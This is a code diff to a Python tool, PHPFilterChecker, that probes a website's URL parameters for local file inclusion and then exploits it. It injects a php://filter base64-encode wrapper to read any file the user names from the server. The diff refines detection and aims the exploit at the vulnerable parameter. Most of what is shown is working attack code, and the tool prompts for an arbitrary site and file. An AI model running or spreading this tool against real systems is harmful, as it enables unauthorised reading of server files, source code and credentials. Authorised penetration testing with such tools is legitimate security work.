@@ -47,11 +47,11 @@ class PHPFilterChecker:
 
         if not self.silent:
             with Progress(console=self.console) as progress:
-                return self._scan(params, file_paths, parsed_url, self.console, total_operations, progress)
+                return self._scan(params, file_paths, parsed_url, total_operations, progress)
 
-        return self._scan(params, file_paths, parsed_url, self.console)
+        return self._scan(params, file_paths, parsed_url)
 
-    def _scan(self, params, file_paths, parsed_url, console, total_operations=None, progress=None):
+    def _scan(self, params, file_paths, parsed_url, total_operations=None, progress=None):
         task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None
 
         for param_name in params.keys():
@@ -64,33 +64,33 @@ class PHPFilterChecker:
                     response = requests.get(fuzzed_url, verify=False)
                 except requests.exceptions.ConnectionError:
                     self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    return False
+                    return False, None
                         
 
                 matches = file_regex.findall(response.text)
                 valid_matches = []
                 for match in matches:
                     try:
-                        base64.b64decode(match)  
-                        valid_matches.append(match)  
+                        base64.b64decode(match)
+                        if len(match) > 50:  
+                            valid_matches.append(match)  
                     except:
                         continue  
-
                 if valid_matches:  
                     if not self.silent:
                         self.console.print(f'\n[bold red]Possible LFI detected (php_filter: method)[/bold red]', style='bold red')
                     self.success_depth = i
                     self.base64_content = valid_matches[0]  
-                    return True
+                    return True, param_name
 
                 if progress:
                     progress.update(task, advance=1)
 
-        return False
+        return False, None
 
 
 
-    def exploit(self, filename):
+    def exploit_file(self, filename, param_name):
         if self.success_depth is None:
             print("No successful LFI detected to exploit.")
             return False
@@ -100,8 +100,7 @@ class PHPFilterChecker:
             params = urllib.parse.parse_qs(parsed_url.query)
             encoded_path = urllib.parse.quote(filename)
             new_params = params.copy()
-            for param in new_params:
-                new_params[param] = 'php://filter/convert.base64-encode/resource=' + encoded_path
+            new_params[param_name] = 'php://filter/convert.base64-encode/resource=' + encoded_path
             new_query = urllib.parse.urlencode(new_params, doseq=True)
             fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
             try:
@@ -143,10 +142,10 @@ def main():
     url = input('Enter site URL to test: ')
     filename = input('Enter filename to display: ')
     checker = PHPFilterChecker(url, silent=False)
-    result = checker.filter_check()
+    result, param_name = checker.filter_check()
     print(f"LFI detected: {result}")
     if result:
-        checker.exploit(filename)
+        checker.exploit_file(filename, param_name)
 
 if __name__ == "__main__":
     main()
